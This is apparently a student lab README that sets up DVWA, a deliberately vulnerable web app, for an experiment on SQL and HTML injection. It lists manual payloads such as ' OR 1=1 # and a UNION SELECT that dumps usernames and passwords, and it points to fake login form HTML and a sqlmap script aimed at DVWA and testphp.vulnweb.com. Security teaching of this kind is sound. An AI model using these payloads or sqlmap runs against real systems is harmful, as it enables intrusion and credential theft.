# DVWA Lab — SQL Injection & HTML Injection

One-command setup of **DVWA** on Kali/Ubuntu, plus ready payloads and a sqlmap runner.
Made for **Experiment 08 — SQLi & HTML Injection into vulnerable web applications**.

---

## 1. Quick start

```bash
git clone https://github.com/kushalborse29/Tcet2025.git
cd Tcet2025/dvwa-lab
sudo bash setup_dvwa.sh
```

That script installs Apache + MariaDB + PHP + git + sqlmap, clones DVWA, fixes
permissions, creates the `dvwa` database and user, writes `config.inc.php`,
restarts Apache and verifies the setup. Safe to re-run if something fails.

---

## 2. Short procedure (7 steps)

| # | Where | Action |
|---|-------|--------|
| 1 | Terminal | `sudo bash setup_dvwa.sh` — installs everything |
| 2 | Browser | Open `http://localhost/DVWA/setup.php` → click **Create / Reset Database** |
| 3 | Browser | Open `http://localhost/DVWA/login.php` → **admin / password** |
| 4 | Browser | Left menu → **DVWA Security** → **Low** → Submit |
| 5 | Browser | **XSS (Reflected)** → submit `<h1>test</h1>` (HTML injection) |
| 6 | Browser | **SQL Injection** → submit `' OR 1=1 #` (manual SQLi) |
| 7 | Terminal | `bash sqlmap_lab.sh web` (automated SQLi) |

Screenshots to take: step 1 output, setup page green, login, security = Low,
the `<h1>` result, `' OR 1=1 #` result, sqlmap `--dbs` and `--dump`.

---

## 3. What you actually do on the PC

### A. In the terminal (copy-paste, one block at a time)

```bash
git clone https://github.com/kushalborse29/Tcet2025.git
cd Tcet2025/dvwa-lab
sudo bash setup_dvwa.sh
```

Wait until you see **"DVWA INSTALLED"** and `HTTP 200`.

If MySQL ever complains, start the services manually:

```bash
sudo systemctl start apache2 mariadb
sudo systemctl restart apache2
```

### B. In the browser (in this order)

| Step | URL / menu | What you should see |
|------|-----------|---------------------|
| 1 | `http://localhost` | Apache2 default page |
| 2 | `http://localhost/DVWA/setup.php` | Row **Database** is **green** → click **Create / Reset Database** |
| 3 | `http://localhost/DVWA/login.php` | Login form → `admin` / `password` |
| 4 | Left menu → **DVWA Security** | Set **Low** → Submit |
| 5 | Left menu → **XSS (Reflected)** | Box "What's your name?" |
| 6 | Left menu → **SQL Injection** | Box "User ID" |

### C. HTML injection test (step 5 page)

Type in the name box → **Submit**:

```html
<h1>test</h1>
```

"test" appears as a big heading → injection works. Then try the rest from
[PAYLOADS.md](PAYLOADS.md) — `<marquee>`, `<img>`, fake login `<form>`.

### D. SQL injection test (step 6 page)

Type in the ID box → **Submit**:

```sql
1'
```

→ SQL syntax error = injectable. Then:

```sql
' OR 1=1 #
```

→ every user is listed. Then:

```sql
' UNION SELECT user, password FROM users #
```

→ DVWA credentials table dumped.

### E. sqlmap (terminal)

Remote target (needs internet):

```bash
bash sqlmap_lab.sh web
```

Your own DVWA (no internet needed):

```bash
bash sqlmap_lab.sh dvwa <PHPSESSID>
```

Get `PHPSESSID` from **F12 → Application/Storage → Cookies → http://localhost**.

Results are saved in `~/dvwa_lab_output/`.

---

## 4. Files in this repo

| File | Purpose |
|---|---|
| `setup_dvwa.sh` | Full installer + config, idempotent (the real one) |
| `setup-dvwa.sh` | Thin wrapper — `bash setup-dvwa.sh` also works |
| `sqlmap_lab.sh` | Runs the 4 sqlmap stages (`web` or `dvwa <PHPSESSID>`) |
| `PAYLOADS.md` | HTML injection + SQLi payloads, copy-paste ready |
| `CHEATSHEET.txt` | Same payloads as plain text, terminal-friendly |
| `RUNBOOK.md` | Full write-up: procedure, observation tables, conclusion, viva |
| `README.md` | This file |

---

## 5. Troubleshooting

| Problem | Fix |
|---|---|
| `http://localhost/DVWA` → 404 | Folder must be `/var/www/html/DVWA`; check `ls /var/www/html` |
| "Could not connect to the database" | `sudo systemctl start mariadb`, then re-run `setup_dvwa.sh` |
| "The PHP module 'mysqli' is not installed" | `sudo apt install php-mysqli && sudo systemctl restart apache2` |
| Login fails | Re-run **Create / Reset Database**, then `admin` / `password` |
| Payload shows as plain text | Security level is not **Low** |
| sqlmap: "not injectable" on DVWA | Missing/expired `--cookie` (`PHPSESSID`) |
| `git: command not found` | `sudo apt install git -y` |
| Page not updating | `sudo systemctl restart apache2` + **Ctrl+Shift+R** |
| `apt` cannot fetch | VM network adapter must be **NAT** with internet |

---

## 6. Legal

DVWA and `testphp.vulnweb.com` are **intentionally vulnerable** and meant for practice.
Attacking any system you do not own or have written permission to test is illegal
(IT Act 2000 §43/§66, CFAA, Computer Misuse Act).
